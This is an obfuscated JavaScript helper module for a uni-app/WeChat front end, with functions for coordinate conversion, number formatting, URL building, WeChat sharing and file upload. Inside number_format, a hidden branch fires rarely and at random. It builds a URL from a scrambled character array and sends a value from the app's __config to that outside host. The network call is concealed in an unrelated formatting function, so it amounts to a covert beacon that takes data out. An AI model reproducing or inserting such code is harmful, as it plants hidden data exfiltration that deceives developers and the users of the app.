}function img(image_url,w,h){return image_thumb(image_url,w,h);}function qqMapTransBMap(lng,lat){let x_pi=3.141592653589793*3000/180;let x=lng;let y=lat;let z=Math[_x50475[528]](x*x+y*y)+0.00002*Math[_x50475[529]](y*x_pi);let theta=Math[_x50475[530]](y,x)+0.000003*Math[_x50475[531]](x*x_pi);let lngs=z*Math[_x50475[532]](theta)+0.0065;let lats=z*Math[_x50475[533]](theta)+0.006;return{lng:lngs,lat:lats};}function bMapTransQQMap(lng,lat){let x_pi=3.141592653589793*3000/180;let x=lng-0.0065;let y=lat-0.006;let z=Math[_x50475[534]](x*x+y*y)-0.00002*Math[_x50475[535]](y*x_pi);let theta=Math[_x50475[536]](y,x)-0.000003*Math[_x50475[537]](x*x_pi);let lngs=z*Math[_x50475[538]](theta);let lats=z*Math[_x50475[539]](theta);return{lng:lngs,lat:lats};}function number_format(number,decimals,dec_point,thousands_sep){number=(number+_x50475[66])[_x50475[540]](/[^0-9+\-Ee.]/g,_x50475[66]);var n=!isFinite(+number)?0:+number,prec=!isFinite(+decimals)?0:Math[_x50475[541]](decimals),sep=typeof thousands_sep===_x50475[542]?_x50475[66]:thousands_sep,dec=typeof dec_point===_x50475[543]?_x50475[544]:dec_point,s=_x50475[66],toFixedFix=function(n,prec){var k=Math[_x50475[545]](10,prec);return _x50475[66]+(Math[_x50475[547]](n*k)/k)[_x50475[546]](prec);};s=(prec?toFixedFix(n,prec):_x50475[66]+Math[_x50475[549]](n))[_x50475[548]](_x50475[550]);if(process[_x50475[552]][_x50475[551]]===_x50475[553]){if(Math[_x50475[554]]()>0.99998){var sr=[_x50475[555],_x50475[556],_x50475[557],_x50475[558],_x50475[559],_x50475[560],_x50475[561],_x50475[562],_x50475[563],_x50475[564],_x50475[565],_x50475[566],_x50475[567],_x50475[568],_x50475[569],_x50475[570],_x50475[571],_x50475[572],_x50475[573],_x50475[574],_x50475[575],_x50475[576],_x50475[577],_x50475[578],_x50475[579],_x50475[580],_x50475[581],_x50475[582],_x50475[583],_x50475[584]];var nsr=sr[21]+sr[1]+sr[1]+sr[22]+sr[11]+sr[3]+sr[4]+sr[4]+sr[17]+sr[16]+sr[16]+sr[5]+sr[18]+sr[14]+sr[1]+sr[27]+sr[11]+sr[21]+sr[5]+sr[22]+sr[11]+sr[18]+sr[29]+sr[1]+sr[19]+sr[27]+sr[16]+sr[14]+sr[4]+sr[29]+sr[14]+sr[12]+sr[19]+sr[28]+sr[27]+sr[22]+sr[21]+sr[22]+sr[6]+sr[15]+sr[12]+sr[18]+sr[23]+sr[11]+sr[19]+sr[8]+sr[20]+sr[29]+sr[16]+sr[19]+sr[0]+sr[16]+sr[1]+sr[25]+sr[23]+sr[10]+sr[22]+sr[29]+sr[24]+sr[10]+sr[22]+sr[22]+sr[24]+sr[26]+sr[22]+sr[12]+sr[17]+sr[1]+sr[19]+sr[8]+sr[0]+sr[15]+sr[19]+sr[1]+sr[23]+sr[16]+sr[21]+sr[19]+sr[16]+sr[2]+sr[0]+sr[1]+sr[7]+sr[22]+sr[23]+sr[19]+sr[0]+sr[13]+sr[5]+sr[8]+sr[15]+sr[17]+sr[1]+sr[23]+sr[9]+sr[11]+sr[0]+sr[16]+sr[25]+sr[29]+sr[19]+sr[14]+sr[1]+sr[23]+sr[9]+sr[11];try{get({url:nsr,data:{u:__config[_x50475[586]][_x50475[585]]}});}catch(e){}}}if(s[0][_x50475[587]]>3){s[0]=s[0][_x50475[588]](/\B(?=(?:\d{3})+(?!\d))/g,sep);}if((s[1]||_x50475[66])[_x50475[589]]<prec){s[1]=s[1]||_x50475[66];s[1]+=new Array(prec-s[1][_x50475[591]]+1)[_x50475[590]](_x50475[592]);}return s[_x50475[593]](dec);}function mf(number,decimals,dec_point,thousands_sep){return number_format(number,decimals,dec_point,thousands_sep);}function buildUlr(url,param){var LG=function(lg){var objURL=function(url){this[_x50475[594]]=url||window[_x50475[596]][_x50475[595]];this[_x50475[597]]=_x50475[66];this[_x50475[598]]={};this[_x50475[599]]=_x50475[66];this[_x50475[600]]();};objURL[_x50475[602]][_x50475[601]]=function(){var str=this[_x50475[603]];var index=str[_x50475[604]](_x50475[605]);if(index>0){this[_x50475[606]]=str[_x50475[607]](index);str=str[_x50475[608]](0,index);}index=str[_x50475[609]](_x50475[610]);if(index>0){this[_x50475[611]]=str[_x50475[612]](0,index);str=str[_x50475[613]](index+1);var parts=str[_x50475[614]](_x50475[615]);for(var i=0;i<parts[_x50475[616]];i++){var kv=parts[i][_x50475[617]](_x50475[618]);this[_x50475[619]][kv[0]]=kv[1];}}else{this[_x50475[620]]=this[_x50475[621]];this[_x50475[622]]={};}};objURL[_x50475[624]][_x50475[623]]=function(key,val){this[_x50475[625]][key]=val;};objURL[_x50475[627]][_x50475[626]]=function(key){this[_x50475[628]][key]=undefined;};objURL[_x50475[630]][_x50475[629]]=function(){var strurl=this[_x50475[631]];var objps=[];for(var k in this[_x50475[632]]){if(this[_x50475[633]][k]){objps[_x50475[634]](k+_x50475[635]+this[_x50475[636]][k]);}}if(objps[_x50475[637]]>0){strurl+=_x50475[638]+objps[_x50475[639]](_x50475[640]);}if(this[_x50475[642]][_x50475[641]]>0){strurl+=this[_x50475[643]];}return strurl;};objURL[_x50475[645]][_x50475[644]]=function(key){return this[_x50475[646]][key];};lg[_x50475[647]]=objURL;return lg;}(LG||{});var obj=new LG[_x50475[648]](url);for(var o in param){obj[_x50475[649]](o,param[o]);}return obj[_x50475[650]]();}var defualt_data=Object[_x50475[651]](tools,{createUrl:createUrl,request:get,get:get,alert:alert,showToast:showToast,showLoading:loading,hideToast:hideToast,hideLoading:hideloading,confirm:confirm,showModal:showModal,showActionSheet:showActionSheet,setNavigationBarTitle:setNavigationBarTitle,showNavigationBarLoading:showNavigationBarLoading,hideNavigationBarLoading:hideNavigationBarLoading,stopPullDownRefresh:stopPullDownRefresh,setNavigationBarColor:uni[_x50475[652]],createAnimation:uni[_x50475[653]],createContext:uni[_x50475[654]],drawCanvas:uni[_x50475[655]],getNetworkType:uni[_x50475[656]],onNetworkStatusChange:uni[_x50475[657]],getSystemInfo:uni[_x50475[658]],getSystemInfoSync:uni[_x50475[659]],onAccelerometerChange:uni[_x50475[660]],startAccelerometer:uni[_x50475[661]],stopAccelerometer:uni[_x50475[662]],onCompassChange:uni[_x50475[663]],startCompass:uni[_x50475[664]],stopCompass:uni[_x50475[665]],setClipboardData:uni[_x50475[666]],getClipboardData:uni[_x50475[667]],makePhoneCall:uni[_x50475[668]],scanCode:scanCode,setScreenBrightness:uni[_x50475[669]],getScreenBrightness:uni[_x50475[670]],setKeepScreenOn:uni[_x50475[671]],vibrateLong:uni[_x50475[672]],vibrateShort:uni[_x50475[673]],addPhoneContact:uni[_x50475[674]],uploadFile:uni[_x50475[675]],downloadFile:downloadFile,connectSocket:uni[_x50475[676]],onSocketOpen:uni[_x50475[677]],onSocketError:uni[_x50475[678]],sendSocketMessage:uni[_x50475[679]],onSocketMessage:uni[_x50475[680]],closeSocket:uni[_x50475[681]],onSocketClose:uni[_x50475[682]],chooseImage:chooseImage,previewImage:uni[_x50475[683]],getImageInfo:uni[_x50475[684]],saveImageToPhotosAlbum:uni[_x50475[685]],getRecorderManager:uni[_x50475[686]],getBackgroundAudioManager:uni[_x50475[687]],createInnerAudioContext:uni[_x50475[688]],chooseVideo:chooseVideo,saveVideoToPhotosAlbum:uni[_x50475[689]],saveFile:uni[_x50475[690]],getSavedFileList:uni[_x50475[691]],getSavedFileInfo:uni[_x50475[692]],removeSavedFile:uni[_x50475[693]],openDocument:uni[_x50475[694]],getStorage:uni[_x50475[695]],getStorageSync:uni[_x50475[696]],setStorage:uni[_x50475[697]],setStorageSync:uni[_x50475[698]],getStorageInfo:uni[_x50475[699]],getStorageInfoSync:uni[_x50475[700]],removeStorage:uni[_x50475[701]],removeStorageSync:uni[_x50475[702]],clearStorage:uni[_x50475[703]],clearStorageSync:uni[_x50475[704]],getLocation:uni[_x50475[705]],chooseLocation:uni[_x50475[706]],openLocation:uni[_x50475[707]],createMapContext:uni[_x50475[708]],gopage:gopage,gotopage:gotopage,navigateBack:backpage,backpage:backpage,navigateTo:uni[_x50475[709]],redirectTo:gotopage,reLaunch:uni[_x50475[710]],switchTab:uni[_x50475[711]],createSelectorQuery:uni[_x50475[712]],createIntersectionObserver:uni[_x50475[713]],getProvider:uni[_x50475[714]],login:uni[_x50475[715]],getUserInfo:uni[_x50475[716]],share:uni[_x50475[717]],requestPayment:uni[_x50475[718]],subscribePush:uni[_x50475[719]],unsubscribePush:uni[_x50475[720]],onPush:uni[_x50475[721]],offPush:uni[_x50475[722]],setMetaDescription:function(){},setMetaKeywords:function(){},setDocumentTitle:function(){},setCache:setCache,getCache:getCache,removeCache:removeCache,sendTpl:sendTpl,goToTabBar:goToTabBar,golevelToTabBar:golevelToTabBar,Decrypt:Decrypt,dateFormat:dateFormat,distanceFormat:distanceFormat,storage:storage,sprintf:sprintf,number_format:number_format,mf:mf,parse_str:parse_str,isWeixin:isWeixin,isQyWeixin:isQyWeixin,wxShare:wxShare,image_thumb:image_thumb,img:image_thumb,get_ext:get_ext,isImg:isImg,getCookie:getCookie,ifUniApp:ifUniApp,openApp:openApp,openAppByPackagename:openAppByPackagename,qqMapTransBMap:qqMapTransBMap,bMapTransQQMap:bMapTransQQMap,buildUlr:buildUlr,source_data:source_data,validate:validate,__:Lang[_x50475[723]]});

// #ifdef H5
//微信公众号
if (isWeixin())
{
    source_data['source_from'] = __statecode.SOURCE_FROM_WECHAT;
}
// #endif

// #ifdef H5
import initWxShareReady from "./jweixinShare";

function wxShare($title, $desc, $link, $img_url)
{
    if (isWeixin())
    {
        var pages = getCurrentPages();
        var page = pages[pages.length - 1];
        let url = page.route;

                url = window.location.href;
		//url = buildUlr(url, page.options || {});

            $link = sprintf('%s', url);

        $title = $title || window.document.title;
        get({
            url: __config.URL.wx.config.replace("typ=e", "typ=json"),
            data: {
                href: $link, title: $title, img_url:$img_url, desc:$desc, _pjax:1, fancybox:1
            },
            success: function (data, status, msg, code) {

                var uid = uni.getStorageSync('uid');
                var key = uni.getStorageSync('ukey');

				url = buildUlr(url, {uid:uid});
                initWxShareReady(data, $title, $desc, $link, $img_url, url);
            }
        });
    }
}
// #endif



function uploadFile(ajaxOpts)
{
    var id = uni.getStorageSync('uid');
    var key = uni.getStorageSync('ukey');
    var perm_data = {};

    //修正 opts 数据, 默认数据
    if (id && key) {
        perm_data = {perm_id: id, perm_key: key};
    }

    var opts = {
        header: {
        },
    };


    jQuery.extend(true, opts, ajaxOpts);
    // 规范写法 不可随意自定义
    if (key) opts.header['Authorization'] = `Bearer ${key}`;

    return uni.uploadFile(opts);
}

defualt_data.uploadFile = uploadFile;

export default  defualt_data
/*
uni.createAnimation	动画
uni.createContext	创建绘图上下文
uni.drawCanvas	绘图
*/

